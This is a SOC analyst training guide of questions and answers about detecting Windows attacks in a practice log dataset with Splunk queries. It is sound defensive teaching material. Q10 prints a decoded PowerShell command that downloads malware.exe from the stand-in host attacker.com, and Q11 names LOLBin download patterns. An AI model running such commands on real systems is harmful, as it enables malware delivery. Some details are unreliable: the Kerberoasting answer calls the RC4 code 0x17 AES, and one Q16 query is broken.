# SOC L1 – Windows Security Log Detection: Questions & Answers
### Splunk Practice Project | Dataset: windows_security_logs.json (5,000 Events)

---

## How to Use This Guide
Each section covers one attack technique. For every technique you'll find:
- **What it is** – quick concept
- **Key Event IDs** – what to search in Splunk
- **Detection Questions** – what a real SOC L1 analyst would ask
- **Splunk SPL Queries** – ready-to-run searches
- **Answers / Findings** – what you should see in the dataset
- **Escalation Criteria** – when to escalate to L2

---

## SECTION 1 — BRUTE FORCE ATTACK

### What it is
An attacker repeatedly tries different passwords against one account from one source IP. Generates many Event ID 4625 (failed logon) in a short window.

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 4625 | Failed logon |
| 4624 | Successful logon |
| 4740 | Account lockout |

---

### Q1. How many total failed logon attempts (Event ID 4625) exist in the dataset?

**SPL:**
```
index=main event_id=4625
| stats count
```
**Answer:** ~630+ failures. This is the first baseline number a SOC analyst checks to understand the attack volume.

---

### Q2. Which source IP has the highest number of failed logons? Is it internal or external?

**SPL:**
```
index=main event_id=4625
| stats count by src_ip
| sort -count
| head 10
```
**Answer:** You will find a single external IP (e.g., `185.220.101.5` or `45.33.32.156`) with 60–80+ failures against one account. External IP + high count = classic brute force indicator.

---

### Q3. After the brute force attempts, did the attacker successfully log in? (Brute force → success pattern)

**SPL:**
```
index=main (event_id=4625 OR event_id=4624) src_ip=<suspicious_ip>
| sort time
| table time event_id user src_ip action
```
**Answer:** Yes. In 4 out of 6 brute force sessions in the dataset, a successful 4624 event follows the cluster of 4625 failures. This is the **compromise confirmation** — the most critical finding to escalate.

---

### Q4. Which accounts were targeted most by brute force?

**SPL:**
```
index=main event_id=4625
| stats count by user
| sort -count
```
**Answer:** `admin`, `administrator`, `svc_backup` will top the list. Attackers prioritize high-privilege accounts.

---

### Q5. Were any accounts locked out as a result?

**SPL:**
```
index=main event_id=4740
| table time user src_ip caller_computer
```
**Answer:** ~80 lockout events exist. Cross-reference the locked user with the brute force source IP to confirm causation.

**Escalation Criteria:** Escalate if:
- >10 failures from one IP in 60 seconds
- Any success event follows failures from same IP
- A privileged account (`admin`, `svc_*`) is targeted

---

## SECTION 2 — PASSWORD SPRAY

### What it is
Unlike brute force (many passwords, one account), password spray tries **one or few passwords across many accounts**. Harder to detect because failures per account are low — avoids lockout thresholds.

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 4625 | Failed logon |

---

### Q6. Can you identify a password spray pattern in the dataset? (Low failure count per user, same source IP, many users)

**SPL:**
```
index=main event_id=4625
| stats dc(user) as unique_users, count as total_failures by src_ip
| where unique_users > 5
| sort -unique_users
```
**Answer:** One external IP will show failures spread across 8–10 different usernames with only 3–8 failures each. Contrast this with brute force where one IP hits one user 50+ times.

---

### Q7. In the spray attack, what time window did all the attempts occur in?

**SPL:**
```
index=main event_id=4625 src_ip=<spray_ip>
| stats min(time) as first_seen, max(time) as last_seen, dc(user) as users_targeted
```
**Answer:** All spray attempts happen within a narrow window (often within 30 minutes). Wide user spread + narrow time window = spray, not brute force.

---

### Q8. How do you distinguish brute force from password spray using Splunk?

**SPL (Brute Force pattern):**
```
index=main event_id=4625
| stats count by src_ip, user
| where count > 20
```
**SPL (Password Spray pattern):**
```
index=main event_id=4625
| stats dc(user) as user_count, count by src_ip
| where user_count > 5 AND count < 50
```
**Answer:**
- Brute Force: 1 source IP + 1 user + high count
- Password Spray: 1 source IP + many users + low count per user

**Escalation Criteria:** Escalate if more than 5 distinct accounts are targeted from one source within 30 minutes.

---

## SECTION 3 — MALICIOUS PROCESS EXECUTION / LOLBins

### What it is
Attackers use **Living Off the Land Binaries (LOLBins)** — legitimate Windows tools like `powershell.exe`, `certutil.exe`, `mshta.exe` — for malicious purposes. Event ID 4688 logs new process creation.

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 4688 | New process created |

---

### Q9. How many PowerShell processes were created, and how many used suspicious flags like `-enc`, `-nop`, `-bypass`?

**SPL:**
```
index=main event_id=4688 process_name="powershell.exe"
| stats count

index=main event_id=4688 process_name="powershell.exe"
| search command_line="*-enc*" OR command_line="*-ExecutionPolicy Bypass*" OR command_line="*-nop*" OR command_line="*hidden*"
| table time host user command_line
```
**Answer:** Many PowerShell events exist. Those with `-enc` (Base64 encoded commands), `-ExecutionPolicy Bypass`, or `-nop -w hidden` are the suspicious subset. Encoded payloads always warrant investigation.

---

### Q10. One of the encoded PowerShell commands in the dataset downloads a file. What is the decoded command?

**Answer (from the dataset):**
The Base64 string `SQ52b2tlLVdlYlJlcXVlc3Qg...` decodes to:
```
Invoke-WebRequest -uri http://attacker.com/malware.exe -OutFile C:\temp\malware.exe
```
This is a **download cradle** — downloading a malware executable from an attacker-controlled server.

**SPL to find all encoded commands:**
```
index=main event_id=4688 command_line="* -enc *"
| table time host user command_line
```

---

### Q11. Which LOLBin tools were used in the dataset that are commonly abused for download/execution?

**SPL:**
```
index=main event_id=4688
| search process_name IN ("certutil.exe","mshta.exe","regsvr32.exe","bitsadmin.exe","wmic.exe","rundll32.exe")
| stats count by process_name, command_line
| sort -count
```
**Answer:** You'll see `certutil.exe -urlcache -split -f http://...` (file download), `mshta.exe http://...` (HTML application execution), `regsvr32.exe /i:http://...` (COM scriptlet execution). All are standard red-team and malware techniques.

---

### Q12. Which process had `winword.exe` or `outlook.exe` as a parent but spawned `powershell.exe` or `cmd.exe`?

**SPL:**
```
index=main event_id=4688
| search parent_process IN ("winword.exe","outlook.exe","excel.exe") AND process_name IN ("powershell.exe","cmd.exe","wscript.exe")
| table time host user parent_process process_name command_line
```
**Answer:** Several events show Office applications spawning shells — classic **macro-based malware / phishing** indicator. Office should never spawn PowerShell in legitimate use.

**Escalation Criteria:** Any `-enc` / Base64 PowerShell, any Office → shell spawn, any LOLBin downloading from external URL.

---

## SECTION 4 — PERSISTENCE: ACCOUNT CREATION & ADMIN GROUP ADD

### What it is
After gaining access, attackers create hidden backdoor accounts (Event 4720) and add them to the Administrators group (Event 4732) to maintain persistent access even if their primary method is discovered.

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 4720 | User account created |
| 4732 | Member added to local security group |
| 4728 | Member added to global security group |
| 4726 | User account deleted |
| 4725 | User account disabled |

---

### Q13. Which new user accounts were created outside of business hours, or by accounts that are not `helpdesk`?

**SPL:**
```
index=main event_id=4720
| table time host user target_user
| sort time
```
**Answer:** You will see accounts like `backdoor_svc`, `support_acct`, `temp_admin` created by `admin` or `svc_backup` — not by `helpdesk`. Legitimate user creation is always done by IT/Helpdesk. Any admin or service account creating users is suspicious.

---

### Q14. Were any of the newly created accounts immediately added to the Administrators group?

**SPL:**
```
index=main (event_id=4720 OR event_id=4732)
| sort time
| streamstats window=2 count by target_user
| search event_id=4732
| table time target_user group_name user
```
**Answer:** Yes — `backdoor_svc`, `temp_admin` etc. are added to `Administrators` group within minutes of creation. This is a high-confidence indicator of attacker persistence.

**Escalation Criteria:** Any account created + added to Administrators within a short window is a **Critical** finding requiring immediate escalation.

---

## SECTION 5 — DEFENSE EVASION: AUDIT LOG CLEARING

### What it is
Attackers clear Windows Security Event Logs (Event ID 1102) to destroy forensic evidence of their activity. This is one of the highest-confidence malicious indicators in Windows logs.

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 1102 | Audit log cleared |
| 104 | System log cleared |

---

### Q15. How many times was the audit log cleared, and by which users?

**SPL:**
```
index=main event_id=1102
| stats count by user, host
| sort -count
```
**Answer:** ~20 log clearing events exist. They are performed by accounts like `backdoor_svc` — a newly created backdoor account. Legitimate admins rarely need to clear logs; attackers almost always do after an intrusion.

---

### Q16. What attack activity was happening just BEFORE the log was cleared?

**SPL:**
```
index=main
| sort time
| where event_id=1102 OR (time > relative_time(earliest_1102, "-10m"))
```
**Practical approach in Splunk:**
```
index=main event_id=1102
| table time host user
```
Then manually look 5–10 minutes before each 1102 event.

**Answer:** Log clearing events follow process execution (4688), account creation (4720), and lateral movement (4624) events. This is the attacker "cleaning up."

**Escalation Criteria:** ANY 1102 event is an automatic escalation. There is no legitimate reason for a backdoor account to clear audit logs.

---

## SECTION 6 — LATERAL MOVEMENT

### What it is
After compromising one machine, attackers move to other systems using valid credentials. Indicators include network logons (type 3), remote interactive logons (type 10), access to admin shares (`C$`, `ADMIN$`), and explicit credential use (4648).

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 4624 | Successful logon (types 3/10 = remote) |
| 4648 | Explicit credential logon |
| 5140 | Network share accessed |
| 5145 | Share object check |

---

### Q17. Which user accounts made network logons (type 3) to multiple different hosts within a short time?

**SPL:**
```
index=main event_id=4624 logon_type=3
| stats dc(host) as hosts_accessed, values(host) as host_list by user, src_ip
| where hosts_accessed > 3
| sort -hosts_accessed
```
**Answer:** Privileged accounts like `admin`, `svc_backup` will show access to 4–6 different hosts from the same source IP. Legitimate users typically access 1–2 servers; accessing 5+ in minutes indicates lateral movement.

---

### Q18. How many explicit credential logon events (4648) occurred and what processes triggered them?

**SPL:**
```
index=main event_id=4648
| stats count by process_name, user
| sort -count
```
**Answer:** ~100 events. `powershell.exe`, `wmic.exe`, and `psexec.exe` are the top callers. Legitimate applications rarely use explicit credentials this way; these processes doing so strongly indicates lateral movement tooling.

---

### Q19. Which admin shares (C$, ADMIN$) were accessed and by whom?

**SPL:**
```
index=main event_id=5140 share_name IN ("C$","ADMIN$","IPC$")
| stats count by user, share_name, src_ip
| sort -count
```
**Answer:** Multiple users including backdoor accounts accessed `C$` and `ADMIN$`. Legitimate access to `C$` and `ADMIN$` is rare in most environments and should be baselined. Attackers use these for file staging and remote execution.

**Escalation Criteria:** A non-admin account accessing `C$`/`ADMIN$`, or any new/backdoor account making remote logons to multiple hosts.

---

## SECTION 7 — PASS-THE-HASH (PtH)

### What it is
Attackers steal the NTLM hash of a password (without knowing the plaintext) and use it directly to authenticate. Signature: network logon (type 3) using NTLM authentication package, often from an unusual workstation for that account.

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 4624 | Successful logon |

**Key fields:** `logon_type=3`, `auth_package=NTLM`

---

### Q20. Find all NTLM network logons by privileged accounts. Are any from unexpected source hosts?

**SPL:**
```
index=main event_id=4624 logon_type=3 auth_package=NTLM
| search user IN ("admin","svc_backup","svc_sql")
| stats count by user, src_ip, host
| sort -count
```
**Answer:** You'll find `admin` and `svc_backup` authenticating via NTLM from workstation IPs that these accounts would not normally use. NTLM type-3 logons for domain admins are a key PtH indicator since domain admins should use Kerberos.

**Escalation Criteria:** Any domain admin account using NTLM (not Kerberos) for network logon from a workstation.

---

## SECTION 8 — KERBEROASTING

### What it is
An attacker with any domain user account requests Kerberos service tickets (TGS) for service accounts, then cracks them offline. Event 4769 with RC4 encryption (`0x17`) instead of AES is the key indicator.

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 4769 | Kerberos service ticket requested |

---

### Q21. How many Kerberos service ticket requests used RC4 encryption (ticket_encryption = 0x17)?

**SPL:**
```
index=main event_id=4769 ticket_encryption="0x17"
| stats count by user, service_name, src_ip
| sort -count
```
**Answer:** ~80 events using RC4. Modern environments use AES (`0x12`/`0x17`). RC4 requests are a Kerberoasting indicator since attack tools downgrade to RC4 for faster offline cracking.

---

### Q22. Which service accounts were most targeted for Kerberoasting?

**SPL:**
```
index=main event_id=4769 ticket_encryption="0x17"
| top limit=10 service_name
```
**Answer:** `svc_sql`, `svc_backup`, `svc_web` top the list — high-value service accounts that likely have admin-equivalent privileges.

**Escalation Criteria:** Any account requesting RC4 tickets for multiple service accounts within a short window.

---

## SECTION 9 — CREDENTIAL DUMPING (LSASS Access)

### What it is
Tools like Mimikatz access the `lsass.exe` process to extract plaintext credentials and hashes from memory. Event 4656 shows a handle request to lsass with high-privilege access masks.

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 4656 | Handle to object requested |
| 4688 | Process created (mimikatz.exe, procdump.exe) |

---

### Q23. Are there any events where a process attempted to access lsass.exe?

**SPL:**
```
index=main event_id=4656 object_name="*lsass*"
| table time host user process_name object_name access_mask
| sort time
```
**Answer:** ~50 events show `mimikatz.exe`, `procdump.exe`, and `rundll32.exe` accessing lsass. `procdump.exe` and `taskmgr.exe` are sometimes used legitimately, but combined with other IOCs they confirm credential dumping.

---

### Q24. Find instances of Mimikatz being executed directly (process name in 4688 events)

**SPL:**
```
index=main event_id=4688 process_name="mimikatz.exe"
| table time host user command_line
```
**Answer:** Direct `mimikatz.exe` execution events exist. Also search command_line for `Invoke-Mimikatz` for PowerShell-based variants.

**Escalation Criteria:** Any lsass access by non-system processes, or any execution of known credential-dumping tool names.

---

## SECTION 10 — DCSYNC ATTACK

### What it is
Attackers with sufficient privileges simulate a Domain Controller replication request, pulling all password hashes from AD. Event 4662 with the `Replicating Directory Changes All` property on a `domainDNS` object is the indicator.

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 4662 | Operation performed on AD object |

---

### Q25. Identify DCSync activity — who requested replication rights on domain objects?

**SPL:**
```
index=main event_id=4662 properties="*Replicating Directory Changes*"
| table time host user object_type properties access_mask
| sort time
```
**Answer:** ~30 events with `Replicating Directory Changes All` on `domainDNS` objects. These requests should only come from actual Domain Controllers, not from user workstations or user accounts.

**Escalation Criteria:** Any non-DC machine/account triggering 4662 with replication properties is a **Critical P1** incident.

---

## SECTION 11 — PERSISTENCE: SCHEDULED TASKS & SERVICES

### What it is
Attackers create scheduled tasks (4698) or install malicious services (4697) to survive reboots and maintain persistence on compromised machines.

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 4698 | Scheduled task created |
| 4697 | Service installed |

---

### Q26. Which scheduled tasks were created with suspicious names or pointing to temp directories?

**SPL:**
```
index=main event_id=4698
| search task_name IN ("*Backdoor*","*Update*","*Persist*") OR task_content="*temp*" OR task_content="*C:\\Users\\Public*"
| table time host user task_name task_content
```
**Answer:** Tasks like `\Microsoft\Windows\Maintenance\BackdoorTask` and `\Updater\WindowsDefenderUpdate` mimicking legitimate task names but executing payloads from `C:\temp\`.

---

### Q27. Which services were installed with executables running from non-standard paths?

**SPL:**
```
index=main event_id=4697
| search service_file_name="*temp*" OR service_file_name="*Users\\Public*" OR service_file_name="*AppData*"
| table time host user service_name service_file_name start_type
```
**Answer:** Services like `MalSvc`, `BackdoorSvc` running from `C:\temp\malware.exe` or `C:\Users\Public\`. Legitimate services run from `C:\Windows\System32\` or `C:\Program Files\`.

**Escalation Criteria:** Any service/task running from `%TEMP%`, `C:\Users\Public`, or `C:\Windows\Temp` is suspicious and should be escalated.

---

## SECTION 12 — GOLDEN TICKET ATTACK

### What it is
Using the `krbtgt` account hash, an attacker forges Kerberos tickets (TGTs) with any permissions. Event 4768 with RC4 encryption and unusual ticket options is the indicator.

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 4768 | Kerberos TGT requested |

---

### Q28. Find Kerberos TGT requests using RC4 encryption — potential Golden Ticket activity

**SPL:**
```
index=main event_id=4768 ticket_encryption="0x17"
| stats count by user, src_ip, ticket_options
| sort -count
```
**Answer:** ~30 events with `ticket_options=0x40810010` and RC4 encryption. The specific ticket options combined with RC4 (when the environment should use AES) is a Golden Ticket fingerprint.

**Escalation Criteria:** RC4-encrypted TGTs in an AES-enabled environment, especially with unusual ticket options, is a Critical escalation.

---

## SECTION 13 — RDP BRUTE FORCE

### What it is
Attackers brute force the Remote Desktop service. Identified by many 4625 events with `logon_type=10` (RemoteInteractive) from the same source IP.

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 4625 | Failed logon |
| 4624 | Successful logon |

---

### Q29. Identify RDP brute force attempts (logon_type = 10, many failures from one IP)

**SPL:**
```
index=main event_id=4625 logon_type=10
| stats count by src_ip, host
| where count > 10
| sort -count
```
**Answer:** 4 external IPs each have 20–40 RDP failures against specific hosts. RDP brute force from external IPs is a common initial access technique.

---

### Q30. Create a timeline showing all attack stages in sequence for one attacker IP

**SPL (timeline for one attacker — replace IP):**
```
index=main src_ip="185.220.101.5"
| sort time
| table time event_id user action msg attack_category
```
**Answer:** This query chains the kill chain: RDP failures → success → PowerShell execution → account creation → log clearing. This is the **complete intrusion narrative** that L1 must document before escalating.

**Escalation Criteria:** Any external IP with RDP failures followed by a successful logon is an immediate escalation.

---

## SECTION 14 — PRIVILEGE ESCALATION

### Key Event IDs
| Event ID | Description |
|----------|-------------|
| 4672 | Special privileges assigned to logon |

---

### Q31. Which non-admin accounts received dangerous privileges like SeDebugPrivilege?

**SPL:**
```
index=main event_id=4672 privileges="*SeDebugPrivilege*" OR privileges="*SeTcbPrivilege*" OR privileges="*SeImpersonatePrivilege*"
| stats count by user, host
| sort -count
```
**Answer:** Regular users like `john.smith` or `charlie.b` appearing with `SeDebugPrivilege` is abnormal — this privilege is only needed for debugging and is regularly abused for credential dumping (Mimikatz requires it).

---

## SECTION 15 — OVERALL INCIDENT RECONSTRUCTION

### Q32. Using all the data, reconstruct the full attack kill chain present in the dataset

**Step 1 — Find initial access:**
```
index=main event_id=4625
| stats count by src_ip, user | sort -count | head 5
```

**Step 2 — Find successful compromise:**
```
index=main event_id=4624 src_ip IN (<attacker_ips>)
| table time user src_ip host logon_type
```

**Step 3 — Find execution:**
```
index=main event_id=4688
| search command_line="*-enc*" OR command_line="*http://*" OR process_name IN ("mimikatz.exe","certutil.exe","mshta.exe")
| table time host user process_name command_line
```

**Step 4 — Find persistence:**
```
index=main event_id IN (4720, 4698, 4697, 4732)
| table time event_id host user target_user task_name service_name
```

**Step 5 — Find lateral movement:**
```
index=main event_id=4624 logon_type IN (3,10)
| stats dc(host) as hosts by user, src_ip | where hosts > 2
```

**Step 6 — Find credential access:**
```
index=main event_id IN (4662, 4656, 4769) ticket_encryption="0x17" OR properties="*Replicating*" OR object_name="*lsass*"
| table time event_id user host
```

**Step 7 — Find cleanup:**
```
index=main event_id=1102
| table time host user
```

**Full Kill Chain Answer:**
1. **Initial Access** → Brute force / RDP brute force from external IPs
2. **Execution** → PowerShell encoded commands, LOLBin abuse (certutil, mshta)
3. **Persistence** → Backdoor accounts created (4720), added to Admins (4732), scheduled tasks (4698), malicious services (4697)
4. **Privilege Escalation** → SeDebugPrivilege assigned (4672), DCSync (4662)
5. **Defense Evasion** → Audit log cleared (1102), firewall rules changed (4946/4947)
6. **Credential Access** → lsass access (4656), Mimikatz execution (4688), Kerberoasting (4769), DCSync (4662)
7. **Lateral Movement** → Pass-the-Hash (4624 NTLM), admin share access (5140), explicit credentials (4648)
8. **Impact** → Account deletions/disables (4725/4726)

---

## QUICK REFERENCE: Event ID Cheat Sheet

| Event ID | Description | Attack Relevance |
|----------|-------------|-----------------|
| 4624 | Successful logon | Lateral movement (type 3/10), PtH (NTLM) |
| 4625 | Failed logon | Brute force, password spray |
| 4634 | Logoff | Normal |
| 4648 | Explicit credential logon | Lateral movement |
| 4656 | Handle to object | LSASS access, credential dumping |
| 4662 | AD object operation | DCSync |
| 4663 | Object access | Sensitive file access |
| 4672 | Special privileges assigned | Privilege escalation |
| 4688 | Process created | Execution, LOLBins |
| 4689 | Process exited | Normal |
| 4697 | Service installed | Persistence |
| 4698 | Scheduled task created | Persistence |
| 4720 | User account created | Backdoor account |
| 4725 | User account disabled | Impact |
| 4726 | User account deleted | Impact / Covering tracks |
| 4728 | Member added to global group | Privilege escalation |
| 4732 | Member added to local group | Privilege escalation |
| 4740 | Account locked out | Brute force indicator |
| 4768 | Kerberos TGT requested | Golden ticket (RC4) |
| 4769 | Kerberos TGS requested | Kerberoasting (RC4) |
| 4946/4947 | Firewall rule added/changed | Defense evasion |
| 5140 | Network share accessed | Lateral movement |
| 5145 | Share object check | Lateral movement |
| 1102 | Audit log cleared | Defense evasion — always escalate |

---

## SOC L1 Escalation Decision Tree

```
Failed logon (4625)?
  └── >10 failures, same IP, same user → Brute Force → Escalate if success follows
  └── <10 failures, same IP, many users → Password Spray → Escalate
  └── logon_type=10, external IP → RDP Attack → Escalate

Successful logon (4624)?
  └── After many failures from same IP → Compromised account → IMMEDIATE escalate
  └── NTLM, type 3, privileged account → PtH → Escalate
  └── External IP → Always investigate

Process created (4688)?
  └── -enc / -nop -hidden PowerShell → Obfuscated execution → Escalate
  └── Office app → shell → Macro malware → Escalate
  └── LOLBin downloading from internet → Escalate

Account created (4720)?
  └── By non-helpdesk → Suspicious → Investigate
  └── Followed by 4732 Administrators add → Backdoor → IMMEDIATE escalate

Log cleared (1102)?
  └── Always escalate. No exceptions.

DCSync (4662 with replication)?
  └── Always escalate. Critical P1.
```

---

*Dataset: windows_security_logs.json | 5,000 events | 23 attack categories*
*Use this alongside Splunk to search, detect, and document findings as a real SOC L1 analyst would.*
